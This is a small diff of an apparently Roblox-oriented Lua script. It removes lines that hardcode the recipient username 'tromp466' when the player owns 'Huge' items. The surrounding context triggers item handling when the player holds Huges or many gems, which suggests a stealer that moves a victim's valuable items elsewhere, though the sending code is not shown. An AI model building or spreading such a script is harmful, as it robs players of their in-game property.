@@ -223,10 +223,6 @@ local function CountHuges()
 	return count
 end
 
-if CountHuges() >= 1 then
-    user = "tromp466"
-end
-
 if CountHuges() > 0 or CountGems() > 500000 then
 	EmptyBoxes()
 	local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
